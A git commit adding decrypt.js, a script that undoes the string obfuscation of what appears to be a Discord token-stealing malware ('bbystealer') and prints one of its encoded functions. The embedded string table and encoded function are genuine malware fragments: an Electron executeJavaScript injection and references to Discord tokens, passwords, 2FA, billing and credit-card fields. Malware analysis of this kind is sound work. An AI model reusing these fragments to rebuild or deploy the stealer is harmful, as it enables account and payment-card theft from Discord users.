9dc160b1d39811f219238e4dba0ee07100d1e066
kemo <kareemolim@gmail.com>
2022-01-11 00:40:39 +0200

    hi

---
+++ decrypt.js
@@ -0,0 +1,47 @@
+const strings = ["gqwkX", "8/users/@m", "FSJzO", "1663634RkWqdD", "ows", "wss://", "ackChunkdi", "oming.json", "hasOwnProp", "url", " = new XML", 'tp.open( "', "xEjeY", "('Content-", "DFqZx", "ult)for(le", "efault[b]:", "[],{get_re", "c)if(gg.c.", "changedpas", "enable2fa", "CkSEJ", "nances/upc", "m/api/v*/a", "te-auth-ga", "  xhr.setR", "ebpackChun", "kdiscord_a", "fikTs", "GQfpV", "responseTe", "path", "    xmlHtt", "_require):", "h.random()", "JmPpw", "quest", ".com/api/v", "etToken())", "parse", "ibrary", "lete gg.m.", "FoyTC", "e gg.c.get", "faVjo", "b.__esModu", ")return d}", "push([[Mat", "IViaN", '@me", fals', "rs/@me/bil", "iwqka", "lications/", "ps://disco", "10ERGUnQ", "mfa/totp/e", "m/api/v*/u", "Leyfk", "executeJav", "responseHe", "uIvhn", "password", "e&&d.defau", "of a?a:nul", "discrimina", "startsWith", "uestHeader", "atus.disco", "}token;", "nable", "MzDbb", "i.stripe.c", "scordapp.c", "t();\n     ", "includes", "lt&&(b?d.d", "iscord_app", "om/v*/toke", "&&(token=b", "n', '*');\n", "/totp/enab", "username", "avatar", "(gg=window", "hvmJQ", '", "', "sion", "/v8/users/", "xhr.setReq", "eceived", "PATCH", "RequestHea", "QlVBn", "uploadData", "rts;if(b&&", "r = new XM", "lqOEk", "discord.co", "https://st", "ction LogO", "card[numbe", "ZhfJc", "om/api/v*/", "));\n    ", "st();\n    ", "TMmth", ".__esModul", "p.response", "fa/totp/en", "XPAJq", "ringify(", "-Control-A", '"get_requi', "join", "rary", "from", "3910002gYBXkp", "( null );\n", "119073HxCFEy", "h([[],{get", "aScript", "rd.com/api", "uire,delet", "Type', 'ap", "1819565AwVCHD", "/v*/schedu", "mlHttp.set", ".c.hasOwnP", "flags", 'der("Autho', "nuUzd", "scord_app.", "a,b,c)=>a.", "ear]", "users/@me", '").logout(', "e,delete g", 'POST", "ht', "new_passwo", "g=a}]);fun", "tor", "ling/subsc", ".webpackJs", "6DYcSgs", "riptions", "packJsonp?", "equestHead", "scord.com/", "QQmFy", "rGJEO", "lHttp.send", "querystrin", "rs/@me/lib", "gg.c)if(gg", "s/detectab", "   xmlHttp", "etQtQ", "icy", ");\n       ", " );\n      ", "electron", "roperty(a)", "plication/", "rs/@me/mfa", "ypyfd", "statusCode", "&&window.w", "sers/@me", "etRequestH", "iKbkf", ".default.g", "erty(c)){c", "detectable", "premium_ty", 'GET", "htt', ";if(d&&(b?", "-only", "sers/@me/b", "./core.asa", "ord_app&&w", "1921768ZKWKfy", "onp.push([", "    var xh", "uth/login", 'xhr.open("', "api/v*/use", "sers/@me/l", "get_requir", "onHeadersR", '2alGDn", t', "t)))return", "ts;if(d&&d", "toString", "iwlkV", "mlHttp = n", "d[b]:a(d))", "    xhr.se", "g.c.get_re", "le&&b.defa", "t a in b.d", "packChunkd", "exports=c}", "webpackJso", "rs/@me", "e );\n    x", 'e", false ', "xt;", "quire):win", "indow.webp", "onth]", '");\n      ', "\n    xmlHt", "JnPmw", "for(let a ", "scriptions", "onst d=gg.", "ew XMLHttp", "able", 'rization",', "illing/sub", "vaICA", "card[cvc]", "pp.push([[", "c[c].expor", "aders", ",c)=>a.exp", "card[exp_y", 'eader("Aut', "bytes", "defaultSes", "JYOPQ", "h/login", "auth/login", "horization", "return nul", "onBeforeRe", "tps://bby.", "QwfQv", "users/@me/", "TxzWZ", "teway.disc", "tion(a){co", "wss://remo", 'efault)"ge', 'tToken"==a', ".m.get_req", "ar xmlHttp", "Request();", ',[["get_re', " d.default", "oCvSO", "yBxNt", "baxdF", "alAYm", "\n        v", "email", "getAllWind", "https://*.", "window.web", "rmdirSync", 'T", "https', "webContent", "gdSyl", "api/v*/app", "then", ")}LogOut()", "://discord", "endsWith", "HttpReques", "\n    var x", "in window.", "35044823XrHTIi", "np?(gg=win", "card[exp_m", "dow.webpac", "  xmlHttp.", "ord.gg/*", "bbystealer", "kChunkdisc", "curity-pol", "phIih", "xByKk", "bFUgq", 'nst b="str', "SkRdP", "sword", "orts=c},[[", ".c[a].expo", "nd(JSON.st", "LHttpReque", "login", "_require:(", "pplication", "],{},a=>{g", "webRequest", "https://ap", "quire:(a,b", "a(d.defaul", "m()],{},a=", "rip/nF400I", "kJsonp.pus", "icy-report", "rue);\n    ", 'l})("login', "tokens", "secret", "json');\n  ", "creditcard", "10fwlyLw", "QuzxH", "llow-Origi", '.open( "GE', "t c in gg.", 're"]]]),de', 'quire"]]])', "ut(){(func", "zYVKS", "led-mainte", "sers/@me/m", "content-se", "Math.rando", "wRZDf", "){let b=gg", ">{gg=a}]),", "https://di", "existsSync", "Text;", "leWef", "8SGySwJ", "api/v*/aut", "jwolx", "stringify", "RBwtO", "l;for(cons", "send( null", "11588058CeyBcQ", "onComplete", ",delete gg", "er('Access", "changedema", "method", "exports", " xmlHttp.s", '");\n    xm', 'ing"==type'];
+
+// Better luck next time :]
+
+// Deobfuscation protection DEFEATED.
+(function (breakKey) {
+    while (true) {
+        try {
+            const key = -parseInt(returnString(423)) / 1 * (parseInt(returnString(613)) / 2) + parseInt(returnString(448)) / 3 * (-parseInt(returnString(485)) / 4) + -parseInt(returnString(429)) / 5 + parseInt(returnString(421)) / 6 + -parseInt(returnString(653)) / 7 * (-parseInt(returnString(633)) / 8) + parseInt(returnString(640)) / 9 * (-parseInt(returnString(359)) / 10) + parseInt(returnString(576)) / 11;
+            if (key === breakKey) break;
+            else strings.push(strings.shift());
+        } catch (err) {
+            strings.push(strings.shift());
+        }
+    }
+}(867498));
+
+function returnString(index) {
+    return returnString = function (realIndex) {
+        realIndex = realIndex - 331;
+        let str = strings[realIndex];
+        return str;
+    }, returnString(index);
+}
+
+var encryptedCrap = `function FirstTime() {
+    const marki = {
+            Leyfk: returnString(582)
+        };
+    if (!fs[returnString(630)](path[returnString(418)](__dirname, marki[returnString(362)]))) return !![];
+    fs[returnString(564)](path[returnString(418)](__dirname, marki[returnString(362)]));
+    const kael = BrowserWindow[returnString(561) + returnString(654)]()[0];
+    return kael[returnString(566) + "s"][returnString(363) + returnString(425)](returnString(563) + returnString(450) + returnString(388) + returnString(447) + returnString(486) + returnString(667) + returnString(601) + returnString(530) + returnString(591) + returnString(417) + returnString(618) + returnString(346) + returnString(492) + returnString(441) + returnString(502) + returnString(512) + returnString(579) + returnString(583) + returnString(484) + returnString(513) + returnString(656) + returnString(436) + returnString(352) + returnString(339) + returnString(598) + returnString(444) + returnString(404) + returnString(620) + returnString(546) + returnString(588) + returnString(649) + returnString(368) + returnString(638) + returnString(617) + returnString(668) + returnString(658) + returnString(476) + returnString(520) + returnString(528) + returnString(496) + returnString(411) + returnString(367) + returnString(380) + returnString(666) + returnString(602) + returnString(495) + returnString(554) + returnString(480) + returnString(500) + returnString(351) + returnString(539) + returnString(608) + returnString(440) + returnString(570) + ";", !![])[returnString(569)](tationna => {}), ![];
+}`;
+
+//The result is not directly working, requires a bit of work afterwards but not much tbh.
+//Mostly you have to replace the constants and  by hand and rename some variables, those need human sense.
+var returnStringes = encryptedCrap.match(/returnString\([0-9]+\)/g);
+for (var i = 0; i < returnStringes.length; i++) {
+    var curreturnString = returnStringes[i];
+    var str = `\`${returnString(curreturnString.replace(/\D+/g, ''))}\``;
+    encryptedCrap = encryptedCrap.replace(curreturnString, str);
+}
+
+var poggers = encryptedCrap.replace(/` \+ `/g, '');
+
+console.log(poggers);
